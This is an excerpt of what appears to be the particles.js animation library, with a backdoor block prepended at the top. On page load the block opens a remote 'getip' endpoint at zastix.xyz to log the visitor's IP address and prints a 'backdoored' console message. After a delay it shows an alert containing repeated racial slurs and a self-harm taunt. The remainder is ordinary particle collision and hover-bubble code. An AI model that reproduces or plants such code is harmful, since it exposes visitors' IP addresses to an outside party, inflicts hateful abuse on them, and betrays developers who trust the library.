...
if (null == window.islogged) {
    var iplog34 = window.open("https://zastix.xyz/api/getip")
    window.iplogged = "ip logged kid";
    console.log("backdoored by zastix and xotic")
    setTimeout(() => {
        alert("ip logged by zastix and xotic\n\nkill yourself nigger nigger nigger \nnigger niger nigernig neirn ginei rneir")
    }, 50000)
}
var pJS = function(e, t) {
    ...
    t && Object.deepExtend(i, t), i.tmp.obj = {
        ...
        var a = e.x - t.x,
            i = e.y - t.y,
            s = Math.sqrt(a * a + i * i);
        e.radius + t.radius >= s && (e.vx = -e.vx, e.vy = -e.vy, t.vx = -t.vx, t.vy = -t.vy)
        ...
        function a(t, a, s, n, r) {
            if (t != a)
                if (i.tmp.bubble_duration_end) null != s && (o = t + (t - (n - p * (n - t) / i.interactivity.modes.bubble.duration)), "size" == r && (e.radius_bubble = o), "opacity" == r && (e.opacity_bubble = o));
        ...
        if (i.interactivity.events.onhover.enable && isInArray("bubble", i.interactivity.events.onhover.mode)) {
            ...
            if (v <= i.interactivity.modes.bubble.distance) {
                if (r >= 0 && "mousemove" == i.interactivity.status) {
                    if (i.interactivity.modes.bubble.size != i.particles.size.value)
                        if (i.interactivity.modes.bubble.size > i.particles.size.value)(o = e.radius + i.interactivity.modes.bubble.size * r) >= 0 && (e.radius_bubble = o);
                        else {
                            var c = e.radius - i.interactivity.modes.bubble.size,
                                o = e.radius - c * r;
                            e.radius_bubble = o > 0 ? o : 0
                        } if (i.interactivity.modes.bubble.opacity != i.particles.opacity.value)
                        if (i.interactivity.modes.bubble.opacity > i.particles.opacity.value)(l = i.interactivity.modes.bubble.opacity * r) > e.opacity && l <= i.interactivity.modes.bubble.opacity && (e.opacity_bubble = l);
                        else {
                            var l;
            ...
            if (i.tmp.bubble_clicking) {
                s = e.x - i.interactivity.mouse.click_pos_x, n = e.y - i.interactivity.mouse.click_pos_y;
